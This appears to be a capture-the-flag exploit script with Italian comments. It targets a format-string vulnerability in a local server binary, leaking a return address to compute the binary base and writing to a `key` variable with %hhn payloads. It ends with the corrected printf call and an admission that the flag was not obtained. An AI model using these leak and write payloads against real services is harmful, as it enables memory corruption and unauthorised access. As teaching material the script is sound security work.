#! /bin/python3

import sys
import struct 
from pwn import *

# Vulnerabilità
# =============
# 
# ```C
# default:
#   printf("ignored line:\n");
#   printf(buf);    // Format string vulnerability
#   break;
# ```
#
# Piano d'attacco
# ===============
# 1. Trovare l'indirizzo di `key`:
#
#    rsi rdx rcx r8  r9  stack[0] ... 
#    .%lx.%lx.%lx.%lx.%lx.%lx ...
#
#    Dopo aver analizzato come il binario esegue tramite gdb,
#    ho potuto notare che l'indirizzo di ritorno della funzione child 
#    viene "interpretato" come il 25esimo argomento di `printf()`.
#    
#    L'indirizzo di ritorno salvato nello stack corrisponde a main+533.
#
# nm server | grep main
# 00000000000014c8 T main
# nm server | grep key
# 000000000000402c B key


offset_main = 0x14c8 
offset_key  = 0x402c
ret_addr    = 0x0
base        = 0x0

try:
    conn = remote("localhost", 10000)
    conn.send(b'0x%25$lx\n')
    if conn.can_recv(1):
        conn.recvline()     # To consume "ignored line:\n"
        ret_addr = conn.recv().decode().strip('\n')
        print(ret_addr)
except EOFError:
    print("Ops...")
finally:
    conn.close()

ret_addr = int(ret_addr, 16)
base = ret_addr - (offset_main + 533)
key  = base + offset_key

print(f"Binary base address: {hex(base)}")
print(f"`key` address: {hex(key)}")


# Esempio di esecuzione in locale:
# $ ./sol.py
# [+] Opening connection to localhost on port 10000: Done
# 0x564c28d816dd
# [*] Closed connection to localhost port 10000
# Binary base address: 0x564c28d80000
# `key` address: 0x564c28d8402c
# cat /proc/$(pgrep server)/maps
# 564c28d80000-564c28d81000 r--p 00000000 103:05 1841262 /.../server

# L'indirizzo di `key` e l'indirizzo base del binario sul server sono i seguenti:
# Binary base address: 0x5648d4563000
# `key` address: 0x5648d456702c

#key = 0x5648d456702c

#
# 2. Scrivere in `key` il valore 0xfab4: possiamo usare %n.
#    Purtroppo, 0xfab4 è un numero non "piccolo". Il nostro 
#    attacco dunque dovrà procedere in due step:
#    
#     a) *key = 0xb4
#     b) *(key+1) = 0xfa
#
# Grazie a `man 3 printf`, possiamo vedere che utilizzato il 
# modificatore di lunghezza hh in sostanza esegue un cast a char*
# l'indirizzo oggetto di scrittura:
#
# ```
# man 3 printf
# ...
# hh     A  following  integer conversion corresponds to a signed char or
#        unsigned char argument, or a following n conversion  corresponds
#        to a pointer to a signed char argument.
#
# ```
#
# Attenzione! il binario usa `fgets`: dobbiamo inserire per "ultimo"
# l'indirizzo di `key` altrimenti i null bytes che sono presenti
# "troncano" il nostro payload.
# 
# L'idea è dunque la seguente:
#       
#       a) primo payload = '.%0178lx.%8$hhn.' + struct.pack('Q', key)
#       b) secondo payload =  '.%0248lx.%8$hhn.' + struct.pack('Q', key+1)
#       c) terzo payload = 'r' e sperare di vedere a stampato a schermo la flag.

payload = [
    b'.%0178lx.%8$hhn.' + struct.pack('Q', key),
    b'.%0248lx.%8$hhn.' + struct.pack('Q', key+1)
]

try:
    conn = remote("localhost", 10000)

    conn.sendline(payload[0])
    if conn.can_recv(2):
        conn.recvline()     # To consume "ignored line:\n"
        conn.recv()

    conn.sendline(payload[1])
    if conn.can_recv(2):
        conn.recvline()     # To consume "ignored line:\n"
        conn.recv()

    conn.send(b'r\n')
    if conn.can_recv(2):
        print(conn.recvline().decode().strip('\n'))
        print(conn.recvuntil(bytes([0x7d])).decode())

except EOFError:
    print("Ops...")
finally:
    conn.close()

# Purtroppo non sono riuscito a stampare la flag :(

# Fix della vulnerabilità
# =======================
# 
# ```C
# default:
#   printf("ignored line:\n");
#   printf("%s\n", buf);
#   break;
# ```
